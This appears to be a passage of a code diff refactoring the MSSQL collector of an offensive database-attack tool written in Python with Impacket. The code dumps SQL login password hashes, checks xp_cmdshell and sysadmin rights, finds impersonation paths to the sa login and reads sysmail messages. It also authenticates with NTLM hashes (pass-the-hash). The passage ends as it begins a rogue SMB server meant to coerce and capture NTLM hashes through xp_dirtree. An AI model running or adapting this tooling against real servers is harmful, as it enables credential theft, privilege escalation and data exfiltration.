@@ -1,198 +1,113 @@
-import mssql_python
-import re
-import secrets
+import socket
 import threading
+
+import mssql_python
 from impacket import smbserver
 from impacket.tds import MSSQL
+
 from collectors.base import BaseCollector
 
-GREEN = "\033[92m"
-YELLOW = "\033[93m"
-RED = "\033[91m"
-RESET = "\033[0m"
+RED = '\033[91m'
+RESET = '\033[0m'
+
 
 class ImpacketMSSQLCursor:
-    """Expose the small cursor interface used by collectors over Impacket TDS."""
-    def __init__(self, connection, database):
+    """Small DB-API adapter that propagates TDS errors without printing them."""
+    def __init__(self, connection):
         self.connection = connection
-        self.database = database or 'master'
         self.rows = []
+        self.description = None
 
     def execute(self, query):
-        use_match = re.match(r'^\s*USE\s+(?:\[([^\]]+)\]|([^\s;]+))\s*;?\s*$', query, re.IGNORECASE)
-        if use_match:
-            self.database = use_match.group(1) or use_match.group(2)
-        self.rows = self.connection.RunSQLQuery(self.database, query, tuplemode=True) or []
+        self.rows = []
+        self.description = None
+        self.connection.lastError = False
+        rows = self.connection.batch(query, tuplemode=True) or []
+        errors = []
+        self.connection.printReplies(error_logger=errors.append, info_logger=lambda message: None)
+        if errors:
+            raise errors[0]
+        self.rows = rows
+        self.description = [(column['Name'],) for column in self.connection.colMeta] or None
 
     def fetchone(self):
-        if not self.rows:
-            return None
-        return self.rows.pop(0)
+        return self.rows.pop(0) if self.rows else None
 
     def fetchall(self):
-        rows = self.rows
-        self.rows = []
+        rows, self.rows = self.rows, []
         return rows
 
+    def close(self):
+        self.rows = []
+
+
 class MSSQLCollector(BaseCollector):
-    def __init__(self, target, port, user, password, skip_data, columns, keywords, domain='', ntlm_hash=''):
-        self.target = target
-        self.port = int(port)
-        self.connection = f'{target},{port}'
-        self.user = user
-        self.password = password
+    type = 'mssql'
+    default_database = 'master'
+    identity_query = 'SELECT ORIGINAL_LOGIN(), SUSER_SNAME()'
+    version_query = 'SELECT @@VERSION'
+    hash_query = 'SELECT name, password_hash FROM sys.sql_logins'
+    user_query = 'SELECT name, is_disabled FROM sys.server_principals'
+    db_name_query = 'SELECT name FROM sys.databases WHERE database_id > 4'
+    table_query = 'SELECT TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES'
+    column_query = '''SELECT COLUMN_NAME, TABLE_SCHEMA, TABLE_NAME, DATA_TYPE
+        FROM INFORMATION_SCHEMA.COLUMNS ORDER BY ORDINAL_POSITION'''
+    cmd_exec_query = "SELECT name, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'"
+    sys_query = "SELECT IS_SRVROLEMEMBER('sysadmin')"
+    db_privs_query = "SELECT IS_ROLEMEMBER('db_owner')"
+    conn_query = 'EXEC sp_who2'
+    link_query = '''SELECT name, product, provider, data_source, is_remote_login_enabled, modify_date
+        FROM sys.servers WHERE is_linked = 1'''
+    impersonation_query = """SELECT name FROM sys.server_principals
+        WHERE type IN ('S', 'U', 'G') AND name <> SUSER_SNAME()
+        AND HAS_PERMS_BY_NAME(name, 'LOGIN', 'IMPERSONATE') = 1"""
+    email_query = 'SELECT TOP 10 recipients, subject, body FROM msdb.dbo.sysmail_allitems'
+
+    def __init__(self, target, port, user, password, skip_data=False, columns=False,
+                 keywords='', domain='', ntlm_hash='', options=None):
+        super().__init__(target, port, user, password, skip_data, columns, keywords, options)
         self.domain = domain
         self.hashes = self.normalizeHashes(ntlm_hash)
-        self.skip_data = skip_data
-        self.columns = columns
-        self.keywords = keywords.replace(',','|')
-
-        self.type = 'mssql'
-
-        self.dir_name = f'results/{self.target.replace(".", "-")}_{self.type}_{secrets.token_hex(2)}'
-
-        self.impersonate = False
-
-        self.version_query = 'SELECT @@VERSION'
-        self.hash_query = 'SELECT name, password_hash FROM sys.sql_logins'
-        self.user_query = 'SELECT name, is_disabled FROM sys.server_principals'
-        self.db_name_query = 'SELECT name FROM sys.databases WHERE database_id > 4'
-        self.cmd_exec_query = 'SELECT name, value_in_use FROM sys.configurations WHERE name = \'xp_cmdshell\';'
-        self.sys_query = 'SELECT IS_SRVROLEMEMBER(\'sysadmin\');'
-        self.conn_query = 'EXEC sp_who2'
-        self.link_query = 'SELECT name AS LinkedServerName, product AS Product, provider AS Provider, data_source AS RemoteAddress, is_remote_login_enabled AS RemoteLogin, modify_date FROM sys.servers WHERE is_linked = 1'
-        # https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-stored-procedures-part-2-user-impersonation/
-        self.impersonation_query = '''
-        SELECT distinct b.name
-        FROM sys.server_permissions a
-        INNER JOIN sys.server_principals b
-        ON a.grantor_principal_id = b.principal_id
-        WHERE a.permission_name = \'IMPERSONATE\'
-        '''
-
-        self.dbs = {}
-        self.findings = {"columns": [], "tables": []}
-        self.matches = []
+        if domain:
+            self.original_login = f'{domain}\\{user}'
 
     @staticmethod
     def normalizeHashes(ntlm_hash):
         if not ntlm_hash:
             return None
-        if ':' in ntlm_hash:
-            return ntlm_hash
-        return f'aad3b435b51404eeaad3b435b51404ee:{ntlm_hash}'
+        return ntlm_hash if ':' in ntlm_hash else f'aad3b435b51404eeaad3b435b51404ee:{ntlm_hash}'
 
-    def createConnection(self, database):
+    def _connect(self, database):
+        # Re-establish impersonation before opening a database that only the
+        # effective login can access.
+        database = self.default_database if self.impersonate else database
         if self.domain:
-            db_name = database or 'master'
-            conn = MSSQL(self.target, port=self.port)
-            if not conn.connect():
-                raise ConnectionError(f'Unable to connect to MSSQL server {self.target}:{self.port}')
-            if not conn.login(
-                db_name,
-                self.user,
-                self.password or '',
-                self.domain,
-                hashes=self.hashes,
-                useWindowsAuth=True,
-            ):
-                conn.disconnect()
+            connection = MSSQL(self.target, port=self.port)
+            self.connection = connection
+            # Impacket's connect() has no timeout argument. Its transport uses
+            # this socket for both pre-login/authentication and subsequent TDS.
+            connection.socket = socket.create_connection(
+                (self.target, self.port), timeout=self.options.connect_timeout)
+            if not connection.login(database, self.user, self.password or '', self.domain,
+                                    hashes=self.hashes, useWindowsAuth=True):
                 raise ConnectionError(f'Windows authentication failed for {self.domain}\\{self.user}')
-            self.cursor = ImpacketMSSQLCursor(conn, db_name)
-            if self.impersonate:
-                self.cursor.execute('EXECUTE AS LOGIN = \'sa\'')
-            return
-
-        if database != '':
-            database = f'Database={database};'
-
-        conn_str = f"SERVER={self.connection};{database}UID={self.user};PWD={self.password};Encrypt=yes;TrustServerCertificate=yes;"
-        conn = mssql_python.connect(conn_str)
-        self.cursor = conn.cursor()
-        if self.impersonate:
-            self.cursor.execute('EXECUTE AS LOGIN = \'sa\'')
-    
-    def getAllTables(self):
-        with open(f'{self.dir_name}/tables.csv', 'w') as f:
-            f.write("TableName,SchemaName,Database\n")
-        for db in self.dbs:
-            table_query = f'SELECT TABLE_NAME, TABLE_SCHEMA FROM {db}.INFORMATION_SCHEMA.TABLES'
-            self.getTables(table_query, db)
-    
-    def getAllColumns(self):
-        with open(f'{self.dir_name}/columns.csv', 'w') as f:
-            f.write('ColumnName,TableName,Database\n')
-        for db in self.dbs:
-            column_query = f'SELECT COLUMN_NAME, TABLE_SCHEMA, TABLE_NAME, TABLE_CATALOG FROM {db}.INFORMATION_SCHEMA.COLUMNS'
-            self.getColumns(column_query, db)
-    
-    def getAllDBPrivs(self):
-        for db in self.dbs:
-            self.checkDBPrivs(db)
-    
-    def getImpersonation(self):
-        try:
-            self.cursor.execute(self.impersonation_query)
-        except Exception as e:
-            print(f'{RED}SQL Error: {e}{RESET}')
-            return
-        rows = self.cursor.fetchall()
-
-        for row in rows:
-            if row[0] == 'sa':
-                print(f'{YELLOW}[!] {row[0]}{RESET}')
-                print(f'[*] All remaining queries are executed as the \'sa\' user...')
-                self.cursor.execute('EXECUTE AS LOGIN = \'sa\'')
-                self.impersonate = True
-            elif (row[0] == '') or (row[0] is None):
-                print(f'{GREEN}User has no impersonation rights :({RESET}')
-            else:
-                print(f'{row[0]}')
-    
-    def checkSysmail(self):
-        sysmail_query = 'SELECT TOP 10 recipients, subject, body FROM msdb.dbo.sysmail_allitems'
-        
-        try:
-            self.cursor.execute(sysmail_query)
-            rows = self.cursor.fetchall()
-
-            if not rows:
-                print(f'{GREEN}No sent emails in sysmail{RESET}')
-                return
-            else:
-                with open(f'{self.dir_name}/emails_10.csv', 'a') as f:
-                    f.write('Recipients,Subject,Body\n')
-                    for row in rows:
-                        f.write(f'{row[0]},{row[1]},{row[2]}\n')
-                print(f'{YELLOW}10 emails written to emails_10.csv!{RESET}')
-
-        except mssql_python.exceptions.ProgrammingError:
-            print(f'{RED}User does not have access to sysmail{RESET}')
-
-    def getAllLoot(self):
-        for db in self.dbs:
-            #self.createConnection(db)
-            self.cursor.execute(f'USE {db}')
-            self.findLoot(db, self.keywords)
-        if self.columns:
-            self.findings['columns'] = self.matches
+            connection.socket.settimeout(self.options.query_timeout)
+            self.cursor = ImpacketMSSQLCursor(connection)
         else:
-            self.findings['tables'] = self.matches
+            def value(text):
+                return '{' + str(text).replace('}', '}}') + '}'
 
-        with open(f'{self.dir_name}/findings.csv', 'a') as f:
-            if self.columns:
-                f.write('ColumnName,TableName,Database,SampleData\n')
-                for item in self.findings['columns']:
-                    f.write(f'{item['ColumnName']},{item['TableName']},{item['Database']},{item['SampleData']}\n')
-            else:
-                f.write('TableName,Database,SampleRow\n')
-                for item in self.findings['tables']:
-                    f.write(f'{item['TableName']},{item['Database']},')
-                    for record in item['SampleRow']:
-                        f.write(f'|{record}')
-                    f.write(f'\n')
+            connection_string = (
+                f'SERVER={value(f"{self.target},{self.port}")};DATABASE={value(database)};'
+                f'UID={value(self.user)};PWD={value(self.password)};'
+                'Encrypt=yes;TrustServerCertificate=yes;'
+            )
+            self.connection = mssql_python.connect(
+                connection_string, timeout=self.options.query_timeout, autocommit=True,
+                attrs_before={mssql_python.SQL_ATTR_LOGIN_TIMEOUT: self.options.connect_timeout})
+            self.connection.timeout = self.options.query_timeout
+            self.cursor = self.connection.cursor()
 
-    
     def coerceXpDirtree(self, local_ip):
         server = smbserver.SimpleSMBServer(listenAddress=local_ip, listenPort=445)
         server.setSMBChallenge('1122334455667788')
